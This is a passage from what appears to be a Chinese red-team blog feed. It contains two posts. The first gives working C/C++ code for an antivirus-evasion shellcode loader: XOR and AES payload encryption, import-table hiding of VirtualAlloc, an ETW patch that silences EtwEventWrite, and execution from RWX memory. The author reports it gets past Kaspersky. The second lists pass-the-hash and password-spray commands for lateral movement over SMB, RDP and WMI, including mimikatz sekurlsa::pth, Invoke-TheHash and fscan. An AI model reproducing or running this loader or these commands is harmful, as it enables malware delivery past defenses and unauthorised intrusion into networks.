class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (plain[i] &gt; <span class="number">96</span> &amp;&amp; plain[i] &lt; <span class="number">123</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ciphertext[i] = plain[i] + k;</span><br><span class="line">            <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">122</span>)</span><br><span class="line">                ciphertext[i] = ciphertext[i] - <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_decryption</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">char</span> plain[], <span class="keyword">char</span> ciphertext[])</span>  <span class="comment">//移位加密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; ciphertext[i] != <span class="string">'\0'</span>; i++)<span class="comment">//确定是字母</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">64</span> &amp;&amp; ciphertext[i] &lt; <span class="number">91</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            plain[i] = ciphertext[i] - k;</span><br><span class="line">            <span class="keyword">if</span> (plain[i] &lt; <span class="number">65</span>)<span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                plain[i] = plain[i] + <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ciphertext[i] &gt; <span class="number">96</span> &amp;&amp; ciphertext[i] &lt; <span class="number">123</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            plain[i] = ciphertext[i] - k;</span><br><span class="line">            <span class="keyword">if</span> (plain[i] &lt; <span class="number">97</span>)<span class="comment">//保证密文是字母，且大小写不发生改变</span></span><br><span class="line">                plain[i] = plain[i] + <span class="number">26</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> password = <span class="number">1025</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> enShellCode[<span class="number">6000</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> deShellCode[<span class="number">6000</span>];</span><br><span class="line">    <span class="keyword">int</span> nLen = <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        enShellCode[i] = buf[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\\x%x"</span>, enShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        deShellCode[i] = enShellCode[i] ^ password;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\\x%x"</span>, deShellCode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h3><p> 获取时间戳来进行aes加密，利用外部库boost获取时间戳。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int64_t GetCurrentStamp64()</span><br><span class="line">&#123;</span><br><span class="line">    /<span class="regexp">/获取当前时间戳(秒or毫秒)</span></span><br><span class="line"><span class="regexp">    boost::posix_time::ptime epoch(boost::gregorian::date(1970, boost::gregorian::Jan, 1));</span></span><br><span class="line"><span class="regexp">    boost::posix_time::time_duration time_from_epoch = boost::posix_time::second_clock::universal_time() - epoch;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    return time_from_epoch.total_seconds();</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">enAES</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 使用ECB模式加密</span></span><br><span class="line">        ECB_Mode&lt; AES &gt;::Encryption e;</span><br><span class="line">        e.SetKey(key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在此处加密</span></span><br><span class="line">        <span class="comment">// StreamTransformationFilter根据需要添加填充，使用PKCS_padding（PKCS7Padding）默认值。</span></span><br><span class="line">        <span class="comment">// ECB和CBC模式必须填充到密码的块大小。</span></span><br><span class="line">        StringSource(strPlain, <span class="literal">true</span>,</span><br><span class="line">            <span class="keyword">new</span> StreamTransformationFilter(e,</span><br><span class="line">                <span class="keyword">new</span> StringSink(strCipher) <span class="comment">// 字符串接收器</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    strEncoded.<span class="built_in">clear</span>();</span><br><span class="line">    StringSource(strCipher, <span class="literal">true</span>,</span><br><span class="line">        <span class="keyword">new</span> HexEncoder(</span><br><span class="line">            <span class="keyword">new</span> StringSink(strEncoded)</span><br><span class="line">        ) <span class="comment">//</span></span><br><span class="line">    ); <span class="comment">// StringSource</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deAES</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// decrypt with ECB mode</span></span><br><span class="line">        ECB_Mode&lt; AES &gt;::Decryption d;</span><br><span class="line">        d.SetKey(key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The StreamTransformationFilter removes padding as required.</span></span><br><span class="line">        <span class="function">StringSource <span class="title">s</span><span class="params">(strCipher, <span class="literal">true</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">new</span> StreamTransformationFilter(d,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">new</span> StringSink(strRecovered) <span class="comment">// StringSink</span></span></span></span><br><span class="line"><span class="function"><span class="params">            ) <span class="comment">// StreamTransformationFilter</span></span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>; <span class="comment">// StringSource</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (<span class="keyword">const</span> Exception&amp; e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cerr</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加载"><a href="#加载" class="headerlink" title="加载"></a>加载</h2><h3 id="导入表混淆"><a href="#导入表混淆" class="headerlink" title="导入表混淆"></a>导入表混淆</h3><h2 id="修改参数为函数名"><a href="#修改参数为函数名" class="headerlink" title="修改参数为函数名"></a>修改参数为函数名</h2><p>原理：对C++程序的导入表进行混淆。不做任何混淆时的导入表存在例如VirtualAlloc这样的敏感函数，通过隐藏函数的方式来减少马子特征。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> VOID *(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T  dwSize, DWORD flAllocationType, DWORD flProtect);</span><br><span class="line">pVirtualAlloc fnVirtualProtect;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sVirtualProtect[] = &#123; <span class="string">'V'</span>,<span class="string">'i'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'a'</span>,<span class="string">'l'</span>,<span class="string">'A'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'c'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sKernel32[] = &#123; <span class="string">'k'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'n'</span>,<span class="string">'e'</span>,<span class="string">'l'</span>,<span class="string">'3'</span>,<span class="string">'2'</span>,<span class="string">'.'</span>,<span class="string">'d'</span>,<span class="string">'l'</span>,<span class="string">'l'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">fnVirtualProtect = (pVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);</span><br><span class="line"><span class="keyword">void</span>* exec = fnVirtualProtect(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec, deShellCode, <span class="keyword">sizeof</span> deShellCode);</span><br><span class="line">((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="禁用Windows事件跟踪-ETW"><a href="#禁用Windows事件跟踪-ETW" class="headerlink" title="禁用Windows事件跟踪 (ETW)"></a>禁用Windows事件跟踪 (ETW)</h2><p>原理：Windows 事件跟踪 (ETW) 是一种有效的内核级跟踪工具，允许你将内核或应用程序定义的事件记录到日志文件中。 可以实时或从日志文件使用事件，并使用它们调试应用程序或确定应用程序中发生性能问题的位置。</p><p>ETW 允许动态启用或禁用事件跟踪，使你可以在生产环境中执行详细的跟踪，而无需重启计算机或应用程序。</p><p>结合混淆导入表代码如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span>* (*tNtVirtual) (HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T  NumberOfBytesToProtect, IN ULONG NewAccessProtection, OUT PULONG OldAccessProtection);</span><br><span class="line">tNtVirtual oNtVirtual;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disableETW</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// return 0</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> patch[] = &#123; <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0xc0</span>, <span class="number">0xc3</span> &#125;;     <span class="comment">// xor rax, rax; ret</span></span><br><span class="line"></span><br><span class="line">    ULONG oldprotect = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span> = <span class="keyword">sizeof</span>(patch);</span><br><span class="line"></span><br><span class="line">    HANDLE hCurrentProc = GetCurrentProcess();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sEtwEventWrite[] = &#123; <span class="string">'E'</span>,<span class="string">'t'</span>,<span class="string">'w'</span>,<span class="string">'E'</span>,<span class="string">'v'</span>,<span class="string">'e'</span>,<span class="string">'n'</span>,<span class="string">'t'</span>,<span class="string">'W'</span>,<span class="string">'r'</span>,<span class="string">'i'</span>,<span class="string">'t'</span>,<span class="string">'e'</span>, <span class="number">0x0</span> &#125;;</span><br><span class="line">    <span class="keyword">void</span>* pEventWrite = GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), (LPCSTR)sEtwEventWrite);</span><br><span class="line">    <span class="keyword">if</span> ((DWORD)GetModuleHandle(<span class="string">"ntdll.dll"</span>) == <span class="literal">NULL</span>) &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"NTDLL.DLL START ADDRESS: %08x"</span>, (DWORD)GetModuleHandle(<span class="string">"ntdll.dll"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((DWORD)GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>) == <span class="literal">NULL</span>) &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"error"</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="built_in">printf</span>(<span class="string">"\nNtProtectVirtualMemory ADDRESS: %08x"</span>, (DWORD)GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>)); &#125;</span><br><span class="line"></span><br><span class="line">    FARPROC farProc = GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>), <span class="string">"NtProtectVirtualMemory"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    oNtVirtual = (tNtVirtual)farProc;</span><br><span class="line">    oNtVirtual(hCurrentProc, &amp;pEventWrite, (PSIZE_T)&amp;<span class="built_in">size</span>, PAGE_READWRITE, &amp;oldprotect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//memcpy(pEventWrite, patch, size / sizeof(patch[0]));</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pEventWrite, patch, <span class="number">4</span>);</span><br><span class="line">    oNtVirtual(hCurrentProc, &amp;pEventWrite, (PSIZE_T)&amp;<span class="built_in">size</span>, oldprotect, &amp;oldprotect);</span><br><span class="line">    FlushInstructionCache(hCurrentProc, pEventWrite, <span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  disableETW();</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* exec = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="杀软测试"><a href="#杀软测试" class="headerlink" title="杀软测试"></a>杀软测试</h2><p>最后马子实测配合其他C2可以过卡巴，但是如果用cs的话国产杀软能过，卡巴过不去，卡巴查杀原因是数据库查杀，CS特征被检测到，得从cs特征上修改。</p><p><img src="/1.png"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/11448?page=1#toc-11" target="_blank" rel="noopener">红队队开发基础-基础免杀(一)</a></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMB_RDP_WMI_hash传递探测_利用</title>
      <link href="/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/"/>
      <url>/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP&#x2F;IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在扫描过程中，我们很可能会同时看到具有在目标上运行的开放端口的协议。<br><br>&emsp;&emsp;使用 SMB 协议，应用程序（或应用程序的用户）可以访问远程服务器上的文件，以及打印机等其他资源。 因此，客户端应用程序可以读取、创建和更新文件远程服务器。 它还可以与任何设置为接收 SMB 客户端的服务器程序通信要求。<br><br>&emsp;&emsp;网络上启用 SMB 的存储称为共享。 任何拥有服务器的地址和正确的凭据。 与许多其他文件访问协议一样，SMB 需要一些安全层在网络拓扑中正常运行。 如果 SMB 允许客户端创建、编辑、<br>检索和删除共享上的文件，显然需要一种身份验证机制。 在用户层面，SMB 客户端需要提供用户名&#x2F;密码组合才能查看内容或与内容交互SMB共享。<br><br>&emsp;&emsp;如果扫描得到目标IP的TCP445开放，为了成功枚举远程系统上的共享内容，我们可以使用一个名为smb客户端。</p><a id="more"></a><h3 id="单IP"><a href="#单IP" class="headerlink" title="单IP"></a>单IP</h3><h4 id="smbexec-hash传递"><a href="#smbexec-hash传递" class="headerlink" title="smbexec_hash传递"></a>smbexec_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\smbexec.exe -hashes :<span class="number">973f</span>cd01b987e913cc0209c2f462a751 ./<span class="symbol">administrator@</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654062783250-d35fada8-94fe-4ec2-8004-665f809dc04f.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=692&id=u09f28a6a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1038&originWidth=1724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128014&status=done&style=none&taskId=udffff2c3-7bde-47c4-a27f-e473f937928&title=&width=1149.3333333333333" alt="image.png"></p><h4 id="SMBExec-hash探测"><a href="#SMBExec-hash探测" class="headerlink" title="SMBExec_hash探测"></a>SMBExec_hash探测</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066837915-33437c7d-ef61-4e52-97f3-ae823c4cbbd5.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=55&id=ua98328a9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=82&originWidth=1618&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24562&status=done&style=none&taskId=uc35fe1c4-3465-4def-88eb-7f95b16d7c6&title=&width=1078.6666666666667" alt="image.png"></p><h3 id="网段"><a href="#网段" class="headerlink" title="网段"></a>网段</h3><h4 id="fscan-SMB探测"><a href="#fscan-SMB探测" class="headerlink" title="fscan_SMB探测"></a>fscan_SMB探测</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fs.exe -h 192.168.1.0/24 -m<span class="built_in"> smb </span>-pwd asd123=</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066674718-5375ef86-6171-41e6-adca-2f78f3fca855.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=454&id=ua6ea3a2d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=681&originWidth=1101&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76007&status=done&style=none&taskId=u6135a004-50ae-43aa-a3b5-7564d19f4cc&title=&width=734" alt="image.png"></p><h4 id="Ps1-hash传递"><a href="#Ps1-hash传递" class="headerlink" title="Ps1_hash传递"></a>Ps1_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066475361-5ddea932-19ca-4944-a7d6-8dc0cb3bf9e5.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=63&id=ub3b799d5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=94&originWidth=1601&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30162&status=done&style=none&taskId=uc4b7af49-776d-4240-9744-f1710c5e47f&title=&width=1067.3333333333333" alt="image.png"></p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;远程桌面协议(RDP)是一个多通道(multi-channel)的协议，让使用者(所在计算机称为用户端或’本地计算机’)连上提供微软终端机服务的计算机(称为服务端或’远程计算机’)。</p><h3 id="单IP-1"><a href="#单IP-1" class="headerlink" title="单IP"></a>单IP</h3><h4 id="mimikatz-hash传递"><a href="#mimikatz-hash传递" class="headerlink" title="mimikatz_hash传递"></a>mimikatz_hash传递</h4><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sekurlsa:</span>:pth <span class="regexp">/user:Administrator /</span><span class="string">domain:</span><span class="number">973</span>fcd01b987e913cc0209c2f462a751 <span class="regexp">/ntlm:973fcd01b987e913cc0209c2f462a751 "/</span><span class="string">run:</span>mstsc.exe /restrictedadmin<span class="string">"</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654063612363-03fa4c1f-0bf8-434f-8d21-4d324ece3229.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=480&id=wGxXK&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=1440&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71054&status=done&style=none&taskId=u696f65af-cee5-4750-b7fa-13a0039a1c4&title=&width=960" alt="image.png"></p><h3 id="网段-1"><a href="#网段-1" class="headerlink" title="网段"></a>网段</h3><h4 id="fscan-扫描"><a href="#fscan-扫描" class="headerlink" title="fscan_扫描"></a>fscan_扫描</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fs.exe -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -m rdp -pwd asd123=</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066642326-95000608-5535-45e9-bbfc-839e1f0daca2.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=497&id=uac555c22&margin=%5Bobject%20Object%5D&name=image.png&originHeight=746&originWidth=1083&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85491&status=done&style=none&taskId=uf5f2f1a4-57e5-4001-93cb-8e9683a2bdf&title=&width=722" alt="image.png"></p><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;WMI的全名为”Windows Management Instrumentation”。从win8后，Windows操作系统都支持WMI，WMI可以在本地或者远程管理计算机系统。<br><br>&emsp;&emsp;自从PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，于是乎攻击者转向使用WMI进行横向移动。在渗透时发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中。因为这个过程不会记录日志，所以对蓝队来说大大增加了溯源的成本。对攻击者来说，被发现的可能性降低，隐蔽性提高。很多APT组织现在都喜欢使用WMI进行攻击。</p><h3 id="单IP-2"><a href="#单IP-2" class="headerlink" title="单IP"></a>单IP</h3><h4 id="WMIExec-hash传递"><a href="#WMIExec-hash传递" class="headerlink" title="WMIExec_hash传递"></a>WMIExec_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span 